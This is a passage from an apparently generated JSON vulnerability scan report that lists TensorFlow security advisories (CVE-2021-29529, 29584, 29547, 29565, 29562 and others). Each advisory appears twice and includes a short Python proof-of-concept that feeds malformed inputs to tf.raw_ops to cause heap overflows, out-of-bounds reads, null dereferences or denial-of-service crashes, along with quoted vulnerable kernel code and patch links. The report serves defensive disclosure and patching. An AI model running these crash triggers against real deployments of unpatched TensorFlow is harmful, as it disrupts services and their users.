7)\ninput_values[0] = 429.6491056791816\ninput_sizes = tf.constant(input_values, shape=[7, 7, 7, 7, 7], dtype=tf.float32)\nfilter_tensor = tf.constant([7, 7, 7, 1, 1], shape=[5], dtype=tf.int32)\nout_backprop = tf.constant([-10.0, -10.0, -10.0, -10.0, -10.0, -10.0, -10.0], shape=[7, 1, 1, 1, 1], dtype=tf.float32)\n  \ntf.raw_ops.Conv3DBackpropFilterV2(input=input_sizes, filter_sizes=filter_tensor, out_backprop=out_backprop, strides=[1, 37, 65, 93, 1], padding=`VALID`, data_format=`NDHWC`, dilations=[1, 1, 1, 1, 1])\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/4814fafb0ca6b5ab58a09411523b2193fed23fed/tensorflow/core/kernels/conv_grad_shape_utils.cc#L94-L153) assumes that the `input`, `filter_sizes` and `out_backprop` tensors have the same shape, as they are accessed in parallel.\n\n### Patches\nWe have patched the issue in GitHub commit [8f37b52e1320d8d72a9529b2468277791a261197](https://github.com/tensorflow/tensorflow/commit/8f37b52e1320d8d72a9529b2468277791a261197).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our securityguide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29529",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29529"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29529",
              "help": {
                "text": "Vulnerability CVE-2021-29529\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29529](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29529)\n### Impact\nAn attacker can trigger a heap buffer overflow in `tf.raw_ops.QuantizedResizeBilinear` by manipulating input values so that float rounding results in off-by-one error in accessing image elements:\n\n```python\nimport tensorflow as tf\n\nl = [256, 328, 361, 17, 361, 361, 361, 361, 361, 361, 361, 361, 361, 361, 384]\nimages = tf.constant(l, shape=[1, 1, 15, 1], dtype=tf.qint32)\nsize = tf.constant([12, 6], shape=[2], dtype=tf.int32)\nmin = tf.constant(80.22522735595703)\nmax = tf.constant(80.39215850830078)\n\ntf.raw_ops.QuantizedResizeBilinear(images=images, size=size, min=min, max=max,\n                                   align_corners=True, half_pixel_centers=True)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/44b7f486c0143f68b56c34e2d01e146ee445134a/tensorflow/core/kernels/quantized_resize_bilinear_op.cc#L62-L66) computes two integers (representing the upper and lower bounds for interpolation) by ceiling and flooring a floating point value:\n\n```cc\nconst float in_f = std::floor(in);\ninterpolation-\u003elower[i] = std::max(static_cast\u003cint64\u003e(in_f), static_cast\u003cint64\u003e(0));\ninterpolation-\u003eupper[i] = std::min(static_cast\u003cint64\u003e(std::ceil(in)), in_size - 1);\n```\n  \nFor some values of `in`, `interpolation-\u003eupper[i]` might be smaller than `interpolation-\u003elower[i]`. This is an issue if `interpolation-\u003eupper[i]` is capped at `in_size-1` as it means that `interpolation-\u003elower[i]` points outside of the image. Then, [in the interpolation code](https://github.com/tensorflow/tensorflow/blob/44b7f486c0143f68b56c34e2d01e146ee445134a/tensorflow/core/kernels/quantized_resize_bilinear_op.cc#L245-L264), this would result in heap buffer overflow:\n\n```cc\ntemplate \u003cint RESOLUTION, typename T, typename T_SCALE, typename T_CALC\u003e\ninline void OutputLerpForChannels(const InterpolationCache\u003cT_SCALE\u003e\u0026 xs,\n                                  const int64 x, const T_SCALE ys_ilerp,\n                                  const int channels, const float min,\n                                  const float max, const T* ys_input_lower_ptr,\n                                  const T* ys_input_upper_ptr,\n                                  T* output_y_ptr) {\n  const int64 xs_lower = xs.lower[x];\n  ...\n  for (int c = 0; c \u003c channels; ++c) {\n    const T top_left = ys_input_lower_ptr[xs_lower + c];\n    ...\n  }\n}\n```\n\nFor the other cases where `interpolation-\u003eupper[i]` is smaller than `interpolation-\u003elower[i]`, we can set them to be equal without affecting the output.\n\n### Patches\nWe have patched the issue in GitHub commit [f851613f8f0fb0c838d160ced13c134f778e3ce7](https://github.com/tensorflow/tensorflow/commit/f851613f8f0fb0c838d160ced13c134f778e3ce7).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29529**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29529](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29529)|\n\n### Impact\nAn attacker can trigger a heap buffer overflow in `tf.raw_ops.QuantizedResizeBilinear` by manipulating input values so that float rounding results in off-by-one error in accessing image elements:\n\n```python\nimport tensorflow as tf\n\nl = [256, 328, 361, 17, 361, 361, 361, 361, 361, 361, 361, 361, 361, 361, 384]\nimages = tf.constant(l, shape=[1, 1, 15, 1], dtype=tf.qint32)\nsize = tf.constant([12, 6], shape=[2], dtype=tf.int32)\nmin = tf.constant(80.22522735595703)\nmax = tf.constant(80.39215850830078)\n\ntf.raw_ops.QuantizedResizeBilinear(images=images, size=size, min=min, max=max,\n                                   align_corners=True, half_pixel_centers=True)\n```\n\nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/44b7f486c0143f68b56c34e2d01e146ee445134a/tensorflow/core/kernels/quantized_resize_bilinear_op.cc#L62-L66) computes two integers (representing the upper and lower bounds for interpolation) by ceiling and flooring a floating point value:\n\n```cc\nconst float in_f = std::floor(in);\ninterpolation-\u003elower[i] = std::max(static_cast\u003cint64\u003e(in_f), static_cast\u003cint64\u003e(0));\ninterpolation-\u003eupper[i] = std::min(static_cast\u003cint64\u003e(std::ceil(in)), in_size - 1);\n```\n  \nFor some values of `in`, `interpolation-\u003eupper[i]` might be smaller than `interpolation-\u003elower[i]`. This is an issue if `interpolation-\u003eupper[i]` is capped at `in_size-1` as it means that `interpolation-\u003elower[i]` points outside of the image. Then, [in the interpolation code](https://github.com/tensorflow/tensorflow/blob/44b7f486c0143f68b56c34e2d01e146ee445134a/tensorflow/core/kernels/quantized_resize_bilinear_op.cc#L245-L264), this would result in heap buffer overflow:\n\n```cc\ntemplate \u003cint RESOLUTION, typename T, typename T_SCALE, typename T_CALC\u003e\ninline void OutputLerpForChannels(const InterpolationCache\u003cT_SCALE\u003e\u0026 xs,\n                                  const int64 x, const T_SCALE ys_ilerp,\n                                  const int channels, const float min,\n                                  const float max, const T* ys_input_lower_ptr,\n                                  const T* ys_input_upper_ptr,\n                                  T* output_y_ptr) {\n  const int64 xs_lower = xs.lower[x];\n  ...\n  for (int c = 0; c \u003c channels; ++c) {\n    const T top_left = ys_input_lower_ptr[xs_lower + c];\n    ...\n  }\n}\n```\n\nFor the other cases where `interpolation-\u003eupper[i]` is smaller than `interpolation-\u003elower[i]`, we can set them to be equal without affecting the output.\n\n### Patches\nWe have patched the issue in GitHub commit [f851613f8f0fb0c838d160ced13c134f778e3ce7](https://github.com/tensorflow/tensorflow/commit/f851613f8f0fb0c838d160ced13c134f778e3ce7).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29584",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29584"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29584",
              "help": {
                "text": "Vulnerability CVE-2021-29584\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29584](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29584)\n### Impact\nAn attacker can trigger a denial of service via a `CHECK`-fail in  caused by an integer overflow in constructing a new tensor shape:\n\n```python\nimport tensorflow as tf\n\ninput_layer = 2**60-1\nsparse_data = tf.raw_ops.SparseSplit(\n    split_dim=1, \n    indices=[(0, 0), (0, 1), (0, 2), \n    (4, 3), (5, 0), (5, 1)],\n    values=[1.0, 1.0, 1.0, 1.0, 1.0, 1.0],\n    shape=(input_layer, input_layer),\n    num_split=2,\n    name=None\n    )\n```\n  \nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/0908c2f2397c099338b901b067f6495a5b96760b/tensorflow/core/kernels/sparse_split_op.cc#L66-L70) builds a dense shape without checking that the dimensions would not result in overflow:\n\n```cc\nsparse::SparseTensor sparse_tensor;\nOP_REQUIRES_OK(context,\n               sparse::SparseTensor::Create(\n                 input_indices, input_values,\n                 TensorShape(input_shape.vec\u003cint64\u003e()), \u0026sparse_tensor));\n```\n\nThe [`TensorShape` constructor](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/framework/tensor_shape.cc#L183-L188) uses a `CHECK` operation which triggers when [`InitDims`](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/framework/tensor_shape.cc#L212-L296) returns a non-OK status.\n                    \n```cc               \ntemplate \u003cclass Shape\u003e\nTensorShapeBase\u003cShape\u003e::TensorShapeBase(gtl::ArraySlice\u003cint64\u003e dim_sizes) {\n  set_tag(REP16);\n  set_data_type(DT_INVALID);\n  TF_CHECK_OK(InitDims(dim_sizes));\n}\n```\n\nIn our scenario, this occurs when adding a dimension from the argument results in overflow:\n\n```cc\ntemplate \u003cclass Shape\u003e\nStatus TensorShapeBase\u003cShape\u003e::InitDims(gtl::ArraySlice\u003cint64\u003e dim_sizes) {\n  ...\n  Status status = Status::OK();\n  for (int64 s : dim_sizes) {\n    status.Update(AddDimWithStatus(internal::SubtleMustCopy(s)));\n    if (!status.ok()) {\n      return status;\n    }\n  }\n}\n\ntemplate \u003cclass Shape\u003e\nStatus TensorShapeBase\u003cShape\u003e::AddDimWithStatus(int64 size) {\n  ...\n  int64 new_num_elements;\n  if (kIsPartial \u0026\u0026 (num_elements() \u003c 0 || size \u003c 0)) {\n    new_num_elements = -1;\n  } else {\n    new_num_elements = MultiplyWithoutOverflow(num_elements(), size);\n    if (TF_PREDICT_FALSE(new_num_elements \u003c 0)) {\n        return errors::Internal(\"Encountered overflow when multiplying \",\n                                num_elements(), \" with \", size,\n                                \", result: \", new_num_elements);\n      }\n  }\n  ...\n}\n```\n\nThis is a legacy implementation of the constructor and operations should use `BuildTensorShapeBase` or `AddDimWithStatus` to prevent `CHECK`-failures in the presence of overflows.\n\n### Patches\nWe have patched the issue in GitHub commit [4c0ee937c0f61c4fc5f5d32d9bb4c67428012a60](https://github.com/tensorflow/tensorflow/commit/4c0ee937c0f61c4fc5f5d32d9bb4c67428012a60).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by researchers from University of Virginia and University of California, Santa Barbara.",
                "markdown": "**Vulnerability CVE-2021-29584**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29584](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29584)|\n\n### Impact\nAn attacker can trigger a denial of service via a `CHECK`-fail in  caused by an integer overflow in constructing a new tensor shape:\n\n```python\nimport tensorflow as tf\n\ninput_layer = 2**60-1\nsparse_data = tf.raw_ops.SparseSplit(\n    split_dim=1, \n    indices=[(0, 0), (0, 1), (0, 2), \n    (4, 3), (5, 0), (5, 1)],\n    values=[1.0, 1.0, 1.0, 1.0, 1.0, 1.0],\n    shape=(input_layer, input_layer),\n    num_split=2,\n    name=None\n    )\n```\n  \nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/0908c2f2397c099338b901b067f6495a5b96760b/tensorflow/core/kernels/sparse_split_op.cc#L66-L70) builds a dense shape without checking that the dimensions would not result in overflow:\n\n```cc\nsparse::SparseTensor sparse_tensor;\nOP_REQUIRES_OK(context,\n               sparse::SparseTensor::Create(\n                 input_indices, input_values,\n                 TensorShape(input_shape.vec\u003cint64\u003e()), \u0026sparse_tensor));\n```\n\nThe [`TensorShape` constructor](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/framework/tensor_shape.cc#L183-L188) uses a `CHECK` operation which triggers when [`InitDims`](https://github.com/tensorflow/tensorflow/blob/6f9896890c4c703ae0a0845394086e2e1e523299/tensorflow/core/framework/tensor_shape.cc#L212-L296) returns a non-OK status.\n                    \n```cc               \ntemplate \u003cclass Shape\u003e\nTensorShapeBase\u003cShape\u003e::TensorShapeBase(gtl::ArraySlice\u003cint64\u003e dim_sizes) {\n  set_tag(REP16);\n  set_data_type(DT_INVALID);\n  TF_CHECK_OK(InitDims(dim_sizes));\n}\n```\n\nIn our scenario, this occurs when adding a dimension from the argument results in overflow:\n\n```cc\ntemplate \u003cclass Shape\u003e\nStatus TensorShapeBase\u003cShape\u003e::InitDims(gtl::ArraySlice\u003cint64\u003e dim_sizes) {\n  ...\n  Status status = Status::OK();\n  for (int64 s : dim_sizes) {\n    status.Update(AddDimWithStatus(internal::SubtleMustCopy(s)));\n    if (!status.ok()) {\n      return status;\n    }\n  }\n}\n\ntemplate \u003cclass Shape\u003e\nStatus TensorShapeBase\u003cShape\u003e::AddDimWithStatus(int64 size) {\n  ...\n  int64 new_num_elements;\n  if (kIsPartial \u0026\u0026 (num_elements() \u003c 0 || size \u003c 0)) {\n    new_num_elements = -1;\n  } else {\n    new_num_elements = MultiplyWithoutOverflow(num_elements(), size);\n    if (TF_PREDICT_FALSE(new_num_elements \u003c 0)) {\n        return errors::Internal(\"Encountered overflow when multiplying \",\n                                num_elements(), \" with \", size,\n                                \", result: \", new_num_elements);\n      }\n  }\n  ...\n}\n```\n\nThis is a legacy implementation of the constructor and operations should use `BuildTensorShapeBase` or `AddDimWithStatus` to prevent `CHECK`-failures in the presence of overflows.\n\n### Patches\nWe have patched the issue in GitHub commit [4c0ee937c0f61c4fc5f5d32d9bb4c67428012a60](https://github.com/tensorflow/tensorflow/commit/4c0ee937c0f61c4fc5f5d32d9bb4c67428012a60).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by researchers from University of Virginia and University of California, Santa Barbara."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29547",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29547"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29547",
              "help": {
                "text": "Vulnerability CVE-2021-29547\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29547](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29547)\n### Impact\nAn attacker can cause a segfault and denial of service via accessing data outside of bounds in `tf.raw_ops.QuantizedBatchNormWithGlobalNormalization`:\n\n```python\nimport tensorflow as tf\n\nt = tf.constant([1], shape=[1, 1, 1, 1], dtype=tf.quint8)\nt_min = tf.constant([], shape=[0], dtype=tf.float32)\nt_max = tf.constant([], shape=[0], dtype=tf.float32)\nm = tf.constant([1], shape=[1], dtype=tf.quint8)\nm_min = tf.constant([], shape=[0], dtype=tf.float32)\nm_max = tf.constant([], shape=[0], dtype=tf.float32)\nv = tf.constant([1], shape=[1], dtype=tf.quint8)\nv_min = tf.constant([], shape=[0], dtype=tf.float32)\nv_max = tf.constant([], shape=[0], dtype=tf.float32)\nbeta = tf.constant([1], shape=[1], dtype=tf.quint8)\nbeta_min = tf.constant([], shape=[0], dtype=tf.float32)\nbeta_max = tf.constant([], shape=[0], dtype=tf.float32)\ngamma = tf.constant([1], shape=[1], dtype=tf.quint8)\ngamma_min = tf.constant([], shape=[0], dtype=tf.float32)\ngamma_max = tf.constant([], shape=[0], dtype=tf.float32) \n\ntf.raw_ops.QuantizedBatchNormWithGlobalNormalization(\n  t=t, t_min=t_min, t_max=t_max, m=m, m_min=m_min, m_max=m_max,\n  v=v, v_min=v_min, v_max=v_max, beta=beta, beta_min=beta_min,\n  beta_max=beta_max, gamma=gamma, gamma_min=gamma_min,\n  gamma_max=gamma_max, out_type=tf.qint32,\n  variance_epsilon=0.1, scale_after_normalization=True)\n```                         \n                            \nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/55a97caa9e99c7f37a0bbbeb414dc55553d3ae7f/tensorflow/core/kernels/quantized_batch_norm_op.cc#L176-L189) assumes the inputs are not empty: \n  \n```cc\nconst float input_min = context-\u003einput(1).flat\u003cfloat\u003e()(0);\nconst float input_max = context-\u003einput(2).flat\u003cfloat\u003e()(0);\n...\nconst float mean_min = context-\u003einput(4).flat\u003cfloat\u003e()(0);\nconst float mean_max = context-\u003einput(5).flat\u003cfloat\u003e()(0);\n...\nconst float var_min = context-\u003einput(7).flat\u003cfloat\u003e()(0);\nconst float var_max = context-\u003einput(8).flat\u003cfloat\u003e()(0);\n...\nconst float beta_min = context-\u003einput(10).flat\u003cfloat\u003e()(0);\nconst float beta_max = context-\u003einput(11).flat\u003cfloat\u003e()(0);\n...\nconst float gamma_min = context-\u003einput(13).flat\u003cfloat\u003e()(0);\nconst float gamma_max = context-\u003einput(14).flat\u003cfloat\u003e()(0);\n```\n\nIf any of these inputs is empty, `.flat\u003cT\u003e()` is an empty buffer, so accessing the element at index 0 is accessing data outside of bounds.\n\n### Patches\nWe have patched the issue in GitHub commit [d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b](https://github.com/tensorflow/tensorflow/commit/d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29547**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29547](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29547)|\n\n### Impact\nAn attacker can cause a segfault and denial of service via accessing data outside of bounds in `tf.raw_ops.QuantizedBatchNormWithGlobalNormalization`:\n\n```python\nimport tensorflow as tf\n\nt = tf.constant([1], shape=[1, 1, 1, 1], dtype=tf.quint8)\nt_min = tf.constant([], shape=[0], dtype=tf.float32)\nt_max = tf.constant([], shape=[0], dtype=tf.float32)\nm = tf.constant([1], shape=[1], dtype=tf.quint8)\nm_min = tf.constant([], shape=[0], dtype=tf.float32)\nm_max = tf.constant([], shape=[0], dtype=tf.float32)\nv = tf.constant([1], shape=[1], dtype=tf.quint8)\nv_min = tf.constant([], shape=[0], dtype=tf.float32)\nv_max = tf.constant([], shape=[0], dtype=tf.float32)\nbeta = tf.constant([1], shape=[1], dtype=tf.quint8)\nbeta_min = tf.constant([], shape=[0], dtype=tf.float32)\nbeta_max = tf.constant([], shape=[0], dtype=tf.float32)\ngamma = tf.constant([1], shape=[1], dtype=tf.quint8)\ngamma_min = tf.constant([], shape=[0], dtype=tf.float32)\ngamma_max = tf.constant([], shape=[0], dtype=tf.float32) \n\ntf.raw_ops.QuantizedBatchNormWithGlobalNormalization(\n  t=t, t_min=t_min, t_max=t_max, m=m, m_min=m_min, m_max=m_max,\n  v=v, v_min=v_min, v_max=v_max, beta=beta, beta_min=beta_min,\n  beta_max=beta_max, gamma=gamma, gamma_min=gamma_min,\n  gamma_max=gamma_max, out_type=tf.qint32,\n  variance_epsilon=0.1, scale_after_normalization=True)\n```                         \n                            \nThis is because the [implementation](https://github.com/tensorflow/tensorflow/blob/55a97caa9e99c7f37a0bbbeb414dc55553d3ae7f/tensorflow/core/kernels/quantized_batch_norm_op.cc#L176-L189) assumes the inputs are not empty: \n  \n```cc\nconst float input_min = context-\u003einput(1).flat\u003cfloat\u003e()(0);\nconst float input_max = context-\u003einput(2).flat\u003cfloat\u003e()(0);\n...\nconst float mean_min = context-\u003einput(4).flat\u003cfloat\u003e()(0);\nconst float mean_max = context-\u003einput(5).flat\u003cfloat\u003e()(0);\n...\nconst float var_min = context-\u003einput(7).flat\u003cfloat\u003e()(0);\nconst float var_max = context-\u003einput(8).flat\u003cfloat\u003e()(0);\n...\nconst float beta_min = context-\u003einput(10).flat\u003cfloat\u003e()(0);\nconst float beta_max = context-\u003einput(11).flat\u003cfloat\u003e()(0);\n...\nconst float gamma_min = context-\u003einput(13).flat\u003cfloat\u003e()(0);\nconst float gamma_max = context-\u003einput(14).flat\u003cfloat\u003e()(0);\n```\n\nIf any of these inputs is empty, `.flat\u003cT\u003e()` is an empty buffer, so accessing the element at index 0 is accessing data outside of bounds.\n\n### Patches\nWe have patched the issue in GitHub commit [d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b](https://github.com/tensorflow/tensorflow/commit/d6ed5bcfe1dcab9e85a4d39931bd18d99018e75b).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29565",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29565"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29565",
              "help": {
                "text": "Vulnerability CVE-2021-29565\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29565](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29565)\n### Impact\nAn attacker can trigger a null pointer dereference in the implementation of `tf.raw_ops.SparseFillEmptyRows`:\n\n```python\nimport tensorflow as tf\n\nindices = tf.constant([], shape=[0, 0], dtype=tf.int64)\nvalues = tf.constant([], shape=[0], dtype=tf.int64)\ndense_shape = tf.constant([], shape=[0], dtype=tf.int64)\ndefault_value = 0\n    \ntf.raw_ops.SparseFillEmptyRows(\n    indices=indices, values=values, dense_shape=dense_shape,\n    default_value=default_value)\n```\n\nThis is because of missing [validation](https://github.com/tensorflow/tensorflow/blob/fdc82089d206e281c628a93771336bf87863d5e8/tensorflow/core/kernels/sparse_fill_empty_rows_op.cc#L230-L231) that was covered under a `TODO`. If the `dense_shape` tensor is empty, then `dense_shape_t.vec\u003c\u003e()` would cause a null pointer dereference in the implementation of the op:\n\n```cc\ntemplate \u003ctypename T, typename Tindex\u003e\nstruct SparseFillEmptyRows\u003cCPUDevice, T, Tindex\u003e {\n  Status operator()(OpKernelContext* context, const Tensor\u0026 default_value_t,\n                    const Tensor\u0026 indices_t, const Tensor\u0026 values_t,\n                    const Tensor\u0026 dense_shape_t,\n                    typename AsyncOpKernel::DoneCallback done) {\n    ...\n    const auto dense_shape = dense_shape_t.vec\u003cTindex\u003e();\n    ... \n  }\n}\n``` \n\n### Patches\nWe have patched the issue in GitHub commit [faa76f39014ed3b5e2c158593b1335522e573c7f](https://github.com/tensorflow/tensorflow/commit/faa76f39014ed3b5e2c158593b1335522e573c7f).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team.",
                "markdown": "**Vulnerability CVE-2021-29565**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|low|2.4.2|[CVE-2021-29565](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29565)|\n\n### Impact\nAn attacker can trigger a null pointer dereference in the implementation of `tf.raw_ops.SparseFillEmptyRows`:\n\n```python\nimport tensorflow as tf\n\nindices = tf.constant([], shape=[0, 0], dtype=tf.int64)\nvalues = tf.constant([], shape=[0], dtype=tf.int64)\ndense_shape = tf.constant([], shape=[0], dtype=tf.int64)\ndefault_value = 0\n    \ntf.raw_ops.SparseFillEmptyRows(\n    indices=indices, values=values, dense_shape=dense_shape,\n    default_value=default_value)\n```\n\nThis is because of missing [validation](https://github.com/tensorflow/tensorflow/blob/fdc82089d206e281c628a93771336bf87863d5e8/tensorflow/core/kernels/sparse_fill_empty_rows_op.cc#L230-L231) that was covered under a `TODO`. If the `dense_shape` tensor is empty, then `dense_shape_t.vec\u003c\u003e()` would cause a null pointer dereference in the implementation of the op:\n\n```cc\ntemplate \u003ctypename T, typename Tindex\u003e\nstruct SparseFillEmptyRows\u003cCPUDevice, T, Tindex\u003e {\n  Status operator()(OpKernelContext* context, const Tensor\u0026 default_value_t,\n                    const Tensor\u0026 indices_t, const Tensor\u0026 values_t,\n                    const Tensor\u0026 dense_shape_t,\n                    typename AsyncOpKernel::DoneCallback done) {\n    ...\n    const auto dense_shape = dense_shape_t.vec\u003cTindex\u003e();\n    ... \n  }\n}\n``` \n\n### Patches\nWe have patched the issue in GitHub commit [faa76f39014ed3b5e2c158593b1335522e573c7f](https://github.com/tensorflow/tensorflow/commit/faa76f39014ed3b5e2c158593b1335522e573c7f).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Yakun Zhang and Ying Wang of Baidu X-Team."
              },
              "properties": {
                "security-severity": "2.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "low"
                ]
              }
            },
            {
              "id": "CVE-2021-29562",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-29562"
              },
              "defaultConfiguration": {
                "level": "note"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29562",
              "help": {
                "text": "Vulnerability CVE-2021-29562\nSeverity: low\nFixed Version: 2.4.2\nLink: [CVE-2021-29562](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29562)\n### Impact\nAn attacker can cause a denial of service by exploiting a `CHECK`-failure coming from the implementation of `tf.raw_ops.IRFFT`:\n    \n```python\nimport tensorflow as tf\n\nvalues = [-10.0] * 130\nvalues[0] = -9.999999999999995\ninputs = tf.constant(values, shape=[10, 13], dtype=tf.float32)\ninputs = tf.cast(inputs, dtype=tf.complex64)\nfft_length = tf.constant([0], shape=[1], dtype=tf.int32)\n\ntf.raw_ops.IRFFT(input=inputs, fft_length=fft_length)\n``` \n    \nThe above example causes Eigen code to operate on an empty matrix. This triggers on an assertion and causes program termination.\n\n### Patches\nWe have patched the issue in GitHub commit [1c56f53be0b722ca657cbc7df461ed676c8642a2](https://github.com/tensorflow/tensorflow/commit/1c56f53be0b722ca657cbc7df461ed676c8642a2).\n  \nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security 